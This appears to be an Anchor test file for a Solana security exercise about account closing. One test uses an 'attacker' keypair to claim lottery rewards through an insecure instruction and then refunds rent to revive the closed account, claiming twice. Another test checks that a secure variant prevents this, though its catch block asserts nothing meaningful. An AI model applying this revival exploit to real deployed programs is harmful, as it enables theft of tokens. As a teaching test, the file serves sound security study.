import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { SolanaCloseAccount } from "../target/types/solana_close_account";
import { 
  PublicKey,
  Keypair,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction,
 } from "@solana/web3.js";
import { 
  getOrCreateAssociatedTokenAccount,
  createMint,
  TOKEN_PROGRAM_ID,
  getAccount
 } from "@solana/spl-token";
 import { safeAirdrop } from "./utils/safeAirdrop";
import { expect } from "chai";

describe("solana-close-account", () => {
  // Configure the client to use the local cluster.
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.SolanaCloseAccount as Program<SolanaCloseAccount>;

  //creating the neccessary variables we need throughout
  const attacker = anchor.web3.Keypair.generate();
  let rewardMint: PublicKey
  let mintAuth: PublicKey
  let mint: PublicKey
  let attackerLotteryEntry: PublicKey
  let attackerAta: PublicKey

  before(async () => {
    //getting the token mint account -> the PDA we have defined
    [mint] = PublicKey.findProgramAddressSync(
      [
        Buffer.from("mint-seed")
      ],program.programId);
    mintAuth = mint;
    
    //airdrop some SOL to the attacker
    await safeAirdrop(attacker.publicKey, provider.connection);
    
    //creating the reward token mint
    rewardMint = await createMint(
      provider.connection,
      attacker,
      mintAuth,
      null,
      6
    );

    //attacker's lottery entry
    [attackerLotteryEntry] = PublicKey.findProgramAddressSync(
      [attacker.publicKey.toBuffer()]
      ,program.programId
    );

    //attackers associated token account
    attackerAta = (await getOrCreateAssociatedTokenAccount(
      provider.connection,
      attacker,
      rewardMint,
      attacker.publicKey
    )).address;
  });

  it("Enter lottery.", async () => {
    await program.methods
    .enterLottery()
    .accounts({
      lotteryEntry: attackerLotteryEntry,
      user: attacker.publicKey,
      userAta: attackerAta,
      systemProgram: SystemProgram.programId,
    })
    .signers([attacker])
    .rpc();

    expect(1).to.equal(1);
    console.log("✅Transaction was successful.");
  })

  it("attacker  can close + refund lottery account + claim multiple rewards", async () => {
    for(let i = 0; i<2; i++){
      const tx = new Transaction();

      //instruction claims the rewards, the program will try to close the account
      tx.add(
        await program.methods
        .redeemWinningsInsecure()
        .accounts({
          lotteryEntry : attackerLotteryEntry,
          user : attacker.publicKey,
          userAta : attackerAta,
          rewardMint : rewardMint,
          mintAuth: mintAuth,
            tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction()
      );

      //user adds instruction to get the refund of the lamports from the lottery account
      const rentExemptionLamports = await provider.connection.getMinimumBalanceForRentExemption(82, "confirmed");
      
      //refund before the transaction lamports
      tx.add(
        SystemProgram.transfer({
          fromPubkey : attacker.publicKey,
          toPubkey : attackerLotteryEntry,
          lamports : rentExemptionLamports
        })
      );

      //send the transaction with all the instructions
      await sendAndConfirmTransaction(provider.connection, tx, [attacker])
      await new Promise((x) => setTimeout(x, 5000))
    }

    const ata = await getAccount(provider.connection, attackerAta);
    const lotteryEntry = await program.account.lotteryAccount.fetch(attackerLotteryEntry);

    expect(Number(ata.amount)).to.equal(
      //since we run this transaction 2 times
      lotteryEntry.timestamp.toNumber() * 10 * 2
    );
  })

  it("attacker cannot claim the reward multiple times", async() => {
    const tx = new Transaction();
    //instruction claims rewards, program will try to close account
    tx.add(
      await program.methods
        .redeemWinningsSecure()
        .accounts({
          lotteryEntry: attackerLotteryEntry,
          user: attacker.publicKey,
          userAta: attackerAta,
          rewardMint: rewardMint,
          mintAuth: mintAuth,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction(),
    );

    // user adds instruction to refund dataAccount lamports
    const rentExemptLamports =
    await provider.connection.getMinimumBalanceForRentExemption(
      82,
      "confirmed",
    );

    //refund the lamports to yourself
    tx.add(
      SystemProgram.transfer({
        fromPubkey: attacker.publicKey,
        toPubkey: attackerLotteryEntry,
        lamports: rentExemptLamports,
      }),
    );

    //send tx
    await sendAndConfirmTransaction(provider.connection, tx, [attacker]);

    //try sending the refund instruction again
    try{
      await program.methods
        .redeemWinningsSecure()
        .accounts({
          lotteryEntry: attackerLotteryEntry,
          user: attacker.publicKey,
          userAta: attackerAta,
          rewardMint: rewardMint,
          mintAuth: mintAuth,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .signers([attacker])
        .rpc();

    }catch(error){
      //console.log(error.message);
      expect(error);
    }
  });
});
